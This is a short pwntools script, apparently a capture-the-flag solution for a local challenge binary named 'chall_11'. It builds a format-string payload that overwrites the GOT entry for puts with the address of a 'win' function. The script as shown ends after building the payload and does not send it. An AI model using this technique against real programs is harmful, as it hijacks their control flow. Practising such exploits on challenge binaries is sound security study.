from pwn import *

p = process('./chall_11')
elf = ELF('./chall_11')
winFunc = 0x08049216

payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win}, write_size='byte')